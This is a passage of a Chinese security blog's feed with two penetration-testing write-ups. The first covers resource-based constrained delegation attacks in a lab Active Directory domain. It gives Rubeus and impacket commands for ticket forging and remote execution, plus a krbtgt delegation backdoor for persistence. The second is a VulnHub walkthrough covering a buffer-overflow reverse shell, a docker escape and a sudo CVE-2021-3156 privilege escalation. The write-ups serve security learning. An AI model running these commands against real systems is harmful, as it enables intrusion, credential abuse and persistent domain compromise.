+
+<p>清除票据</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318162000613.png" class title="image-20220318162000613">
+
+<p>此时再去申请票据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54 /impersonateuser:administrator /msdsspn:cifs/PC2.whoamianony.org /ptt &gt; log.txt</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318162252245.png" class title="image-20220318162252245">
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318162307877.png" class title="image-20220318162307877">
+
+<p>当账户不可委派以及受保护组的成员可以完成S4U2Self，可以使用<code>Rubeus describe</code>查看一下S4U2self返回的票据信息，可以看到该票据是没有服务名称的，并且不可转发。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rubeus.exe describe /ticket:申请的票据的base64值</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318174454339.png" class title="image-20220318174454339">
+
+<p>这里可以看到申请的servicename本来应该为cifs&#x2F;PC2（host&#x2F;PC2），但是这里只有win7，这是因为服务名称丢失了，只需要补上就可以了。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:ldap [/ptt] [/luid]</span><br><span class="line">Rubeus.exe tgssub &lt;/ticket:BASE64 | /ticket:FILE.KIRBI&gt; /altservice:cifs/computer.domain.com [/ptt] [/luid]</span><br></pre></td></tr></table></figure>
+
+<p>如下（这里我一直使用的是加密后的base64，因为使用kirbi会报莫名其妙的错误）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe tgssub /ticket:请求cifs票据的base64值 /altservice:cifs/PC2.whoamianony.org /ptt</span><br><span class="line">Rubeus.exe tgssub /ticket:请求host票据的base64值 /altservice:host/PC2.whoamianony.org /ptt</span><br></pre></td></tr></table></figure>
+
+<p>未申请之前</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318175059468.png" class title="image-20220318175059468">
+
+
+
+<p>申请之后</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318175404412.png" class title="image-20220318175404412">
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318175630923.png" class title="image-20220318175630923">
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318180737281.png" class title="image-20220318180737281">
+
+<p>这里申请host的票据也是一样的步骤，就不再赘述了</p>
+<h3 id="利用基于资源的约束委派进行域权限维持"><a href="#利用基于资源的约束委派进行域权限维持" class="headerlink" title="利用基于资源的约束委派进行域权限维持"></a>利用基于资源的约束委派进行域权限维持</h3><p>主要思想是：在获得域控的管理员权限后，修改krbtgt或是域控的<code>msDS-AllowedToActOnBehalfOfOtherIdentity</code>属性，加入已知后门账户的SID。</p>
+<p>根据这样基于资源的约束委派攻击生成白银票据的方式进行权限维持</p>
+<p>1、配置注册的主机账号（比如我这里的主机账号是win7）到krbtgt基于资源的约束委派</p>
+<p>2、配置注册的主机账号（比如我这里的主机账号是win7）到域控基于资源的约束委派</p>
+<p>这是windows 版本在2012之下（我的域控是2012的，所以这里选择第二种方法）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-1315137663-3706837544-1429009142-2103)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Set-DomainObject krbtgt -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在windows版本在2012及以上</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Set-ADUser krbtgt -PrincipalsAllowedToDelegateToAccount win7$</span><br><span class="line">Get-ADUser krbtgt -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318202451168.png" class title="image-20220318202451168">
+
+<p>注意这是做权限维持，这是在域控上操作的</p>
+<p>修改Krbtgt用户的PrincipalsAllowedToDelegateToAccount属性后，我们已经做好了后门了，然后就可以请求TGT</p>
+<p>请求成功！</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe s4u /user:win7$ /rc4:E096DB6B6E179132B8000763599B4C54  /impersonateuser:administrator /msdsspn:krbtgt /ptt</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318203355644.png" class title="image-20220318203355644">
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318203411815.png" class title="image-20220318203411815">
+
+<p>然后利用s4u2proxy返回的TGT去申请一张访问域控cifs服务的ST2</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asktgs /user:win7$ /enctype:rc4 /service:cifs/DC /domain:whoamianony.org /ticket:请求的ST2的base64 /ptt</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318204344841.png" class title="image-20220318204344841">
+
+<p>我不知道为什么这里报了一个小错误，但确实可以请求一个ST访问域控了。请求host服务一样的方法</p>
+<p>这样请求票据只能一个一个请求，用impacket工具包会方便很多</p>
+<p>这里先删除票据</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318204546537.png" class title="image-20220318204546537">
+
+
+
+<p>使用impacket工具，这里我不知道为什么一直无法将票据进行设置，原理是没错的</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">getst_windows.exe -dc-ip 192.168.93.30 -spn krbtgt -impersonate Administrator whoamianony.org/win7$:win7</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set KRB5CCNAME=Administrator.ccache</span><br><span class="line">wmiexec.exe -no-pass -k DC</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="在域外进行基于资源的约束委派攻击"><a href="#在域外进行基于资源的约束委派攻击" class="headerlink" title="在域外进行基于资源的约束委派攻击"></a>在域外进行基于资源的约束委派攻击</h3><p>SharpAllowedToAct可以自动生成机器账户</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SharpAllowedToAct.exe -m hacker -p hacker -t PC2 -a 192.168.93.30 whoamianony.org</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318223625113.png" class title="image-20220318223625113">
+
+<p>可以看到确实生成了用户</p>
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318223702223.png" class title="image-20220318223702223">
+
+
+
+<p>获得服务票据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 getST.py -dc-ip 192.168.93.30 whoamianony/hacker\$:hacker -spn cifs/PC2.whoamianony.org -impersonate administrator</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318224914156.png" class title="image-20220318224914156">
+
+<p>将票据导入内存</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>
+
+
+
+<p>直接连接目标机</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 smbexec.py -no-pass -k PC2.whoamianony.org</span><br></pre></td></tr></table></figure>
+
+<img data-src="/2022/03/18/%E5%9F%BA%E4%BA%8E%E8%B5%84%E6%BA%90%E7%9A%84%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE/image-20220318232610317.png" class title="image-20220318232610317">
+
+<p>这里有个坑，要在&#x2F;etc&#x2F;hosts下手动把PC2.whoamianony.org解析成192.168.93.40</p>
+<p>impacket工具包里面的脚本是可以完成基于资源的约束委派的攻击的，这里就不再研究了，原理都是一样的，只是使用的脚本方法不一样。</p>
+]]></content>
+      <categories>
+        <category>内网</category>
+      </categories>
+      <tags>
+        <tag>域渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>vulnhub之缓冲区溢出</title>
+    <url>/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/</url>
+    <content><![CDATA[<h1 id="初步的信息收集"><a href="#初步的信息收集" class="headerlink" title="初步的信息收集"></a>初步的信息收集</h1><p>对靶机进行端口扫描，看到开放了21端口留意可能有匿名登陆</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304203927341.png" class title="image-20220304203927341">
+
+
+
+<p>扫描一下端口开放的详细服务信息</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204123320.png" class title="image-20220304204123320">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204147762.png" class title="image-20220304204147762">
+
+
+
+<p>这种有ctf风格的靶场肯定不会开一个没有意义的端口的。。登陆ftp服务，顺便搜一波现成的漏洞。搜出来是ddos，打扰了。</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204345188.png" class title="image-20220304204345188">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204404524.png" class title="image-20220304204404524">
+
+
+
+<p>ftp中可能有好东西，看见的东西都下载到本机</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204505067.png" class title="image-20220304204505067">
+
+
+
+<p>查看下载的文件，运行下发现居然没东西</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204646309.png" class title="image-20220304204646309">
+
+
+
+<p>看到这里感觉不对劲，这是个可执行程序，执行了肯定有进程产生的，看一看进程吧</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304204847774.png" class title="image-20220304204847774">
+
+
+
+<p>再联想到目标靶机开启了9898端口，八九不离十了这就是突破点，但还是看一看web服务吧</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205134019.png" class title="image-20220304205134019">
+
+
+
+<p>对web进行信息搜集一波，看看源代码，爆破一下目录</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205236054.png" class title="image-20220304205236054">
+
+
+
+<p>更确定了这极有可能是应用程序的漏洞，监听本地9898端口</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205522149.png" class title="image-20220304205522149">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205537331.png" class title="image-20220304205537331">
+
+<p>看到这里已经懂得都懂了，直接进入正题了</p>
+<h1 id="edb调试"><a href="#edb调试" class="headerlink" title="edb调试"></a>edb调试</h1><p>如果kali没有安装edb-debugger，可以先安装一个</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304205836105.png" class title="image-20220304205836105">
+
+
+
+<p>开启本地监听打开edb进行调试，这个地方一定要以root权限打开edb不然会有各种问题</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223641368.png" class title="image-20220304223641368">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223654911.png" class title="image-20220304223654911">
+
+
+
+<p>python生成500个A注入到程序中，观察edb发生的变化</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223811343.png" class title="image-20220304223811343">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223827023.png" class title="image-20220304223827023">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223855172.png" class title="image-20220304223855172">
+
+<p>（报错了，一切都在设想当中）</p>
+<p>EIP寄存器全被被A占满，说明一定在这个参数输入的地方存在缓冲区溢出</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304223926084.png" class title="image-20220304223926084">
+
+
+
+<p>理清思路接下来要干嘛</p>
+<p>EIP寄存器存储接下来要执行指令的代码所在的内存地址，ESP是寄存具体的代码的。这两个寄存器的内容都可以进行覆盖，如果能找到一个jump to esp，跳转到esp这样的指令他所在内存空间的地址的话，就可以将这条指令的内存地址，写入到eip寄存器，从而利用jump esp指令强制cpu去执行esp中寄存的程序的代码，因此我们可以提交payload内容替换esp中的内容，可以在其中提交反弹shell的程序代码。因此可以修改eip当中的内容，从而将指令跳转到esp寄存器，esp中存储着我们的恶意代码，一旦这些代码被执行，就会反弹一个shell到kali。</p>
+<p>理清思路后再想想第一步要干嘛，就是在eip寄存器当中写入jump esp这条指令的地址，那么首先就要在这500个A当中确定是从哪一个A开始覆盖了eip寄存器，kali当中msf-pattern_create可以生成随机的字符串</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304224821183.png" class title="image-20220304224821183">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304224830607.png" class title="image-20220304224830607">
+
+
+
+<p>注入随机字符串后，edb直接报错（每一次调试都要重新启动应用服务和edb）</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304224959040.png" class title="image-20220304224959040">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225012042.png" class title="image-20220304225012042">
+
+
+
+<p>现在eip中就是随机字符串当中四个字符的ASCII码，再查一下这四个字符再随机字符串的位置</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225131530.png" class title="image-20220304225131530">
+
+<p>这里也就是说，从112位置开始，eip寄存器被覆盖了四个字符</p>
+<h1 id="脚本验证，EXP编写"><a href="#脚本验证，EXP编写" class="headerlink" title="脚本验证，EXP编写"></a>脚本验证，EXP编写</h1><p>写个脚本验证，果然eip被四个B占满</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225300919.png" class title="image-20220304225300919">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225319309.png" class title="image-20220304225319309">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225341987.png" class title="image-20220304225341987">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225443972.png" class title="image-20220304225443972">
+
+<p>（这里一定要以python2来执行验证脚本）</p>
+<p>现在就要在edb中查找jump esp的指令地址，一定是有x执行权限的服务</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225558528.png" class title="image-20220304225558528">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225620876.png" class title="image-20220304225620876">
+
+
+
+<p>将结果插入到程序代码（B的位置），因为大头小头字节序，地址从低位到高位读取。’\x55\x9d\x04\x08’</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225751989.png" class title="image-20220304225751989">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225803607.png" class title="image-20220304225803607">
+
+
+
+<p>使用msf生成反弹shell的代码，要过滤坏字符，防止程序遇到\x00终止运行</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225903497.png" class title="image-20220304225903497">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225915589.png" class title="image-20220304225915589">
+
+<p>（空字符是保证程序不出错）</p>
+<p>重启服务端程序设置nc监听</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304225952851.png" class title="image-20220304225952851">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230010631.png" class title="image-20220304230010631">
+
+<p>（这是在本机做的实验）</p>
+<p>将IP端口改为目标机器重新设置监听</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230210120.png" class title="image-20220304230210120">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230219455.png" class title="image-20220304230219455">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230229256.png" class title="image-20220304230229256">
+
+
+
+<h1 id="反弹shell后docker逃逸"><a href="#反弹shell后docker逃逸" class="headerlink" title="反弹shell后docker逃逸"></a>反弹shell后docker逃逸</h1><p>获得了一个普通权限shell，进行信息收集</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230349765.png" class title="image-20220304230349765">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230359143.png" class title="image-20220304230359143">
+
+
+
+<p>ssh连接22端口不行，那么就连接之前探测到的2222端口</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230442016.png" class title="image-20220304230442016">
+
+
+
+<p>好家伙，发现还是个docker容器，那就docker逃逸吧</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230618570.png" class title="image-20220304230618570">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230628961.png" class title="image-20220304230628961">
+
+
+
+<p>权限配置不当，容器有sudo权限，那就切换成容器的root，查看root文件</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230721118.png" class title="image-20220304230721118">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230733436.png" class title="image-20220304230733436">
+
+
+
+<p>查看两个文本文件得知，提示登陆ftp出错，要访问流量（ftp是基于明文的协议类型）</p>
+<p>进行流量分析，只有命令行不能使用wireshark，使用tcpdump</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230851167.png" class title="image-20220304230851167">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230859891.png" class title="image-20220304230859891">
+
+<p>（接收到用户名密码）</p>
+<p>使用账号密码登陆22端口的ssh服务，发现是宿主机</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304230952447.png" class title="image-20220304230952447">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231001814.png" class title="image-20220304231001814">
+
+
+
+<h1 id="进一步信息收集，利用堆溢出漏洞提权"><a href="#进一步信息收集，利用堆溢出漏洞提权" class="headerlink" title="进一步信息收集，利用堆溢出漏洞提权"></a>进一步信息收集，利用堆溢出漏洞提权</h1><p>没有执行sudo的权限</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231226255.png" class title="image-20220304231226255">
+
+
+
+<p>检查内核没戏</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231252289.png" class title="image-20220304231252289">
+
+
+
+<p>抱着永不放弃的精神检查一下还有什么可利用的</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231431058.png" class title="image-20220304231431058">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231440102.png" class title="image-20220304231440102">
+
+
+
+<p>sudo版本低，还是Debian10，直接上谷歌</p>
+<p><a href="https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit">https://blog.qualys.com/vulnerabilities-threat-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit</a></p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231534664.png" class title="image-20220304231534664">
+
+<p>果然，这个版本的sudo有堆溢出</p>
+<p>poc验证sudoedit -s ‘&#39; <code>perl -e &#39;print &quot;A&quot; x 65536&#39;</code></p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231633754.png" class title="image-20220304231633754">
+
+<p>（因输入的大小原因程序发生了错误）</p>
+<p>msf当中有利用代码，show options缺啥补啥吧</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231712112.png" class title="image-20220304231712112">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231738788.png" class title="image-20220304231738788">
+
+
+
+<p>尝试多次后始终不行，怀疑这里有大坑</p>
+<p>查找手动利用代码，<a href="https://github.com/worawit/CVE-2021-3156%EF%BC%8C%E4%BF%AE%E6%94%B9%E4%B8%80%E7%82%B9%E4%BB%A3%E7%A0%81">https://github.com/worawit/CVE-2021-3156，修改一点代码</a></p>
+<p>一番搜寻过后原来这台机器的sudo路径与众不同。。信息收集的重要性体现出来了</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231935353.png" class title="image-20220304231935353">
+
+
+
+<p>打exp，nc来传输</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304231958668.png" class title="image-20220304231958668">
+
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304232010595.png" class title="image-20220304232010595">
+
+
+
+<p>执行exp过后终于打点成功</p>
+<img data-src="/2022/03/04/vulnhub%E4%B9%8B%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA/image-20220304232045850.png" class title="image-20220304232045850">
+
+
+
+<p>总结：总的来说这台靶机挺有意思的，是很基础的溢出漏洞，但作为一台作者表明高难度的靶机确实有他的难处。缓冲区溢出这里是很原理性的操作，更高难度需要逆向分析的溢出这台还没体现出来，以后会慢慢更新。</p>
+]]></content>
+      <categories>
+        <category>有难度的靶场</category>
+      </categories>
+      <tags>
+        <tag>缓冲区溢出</tag>
       </tags>
   </entry>
   <entry>
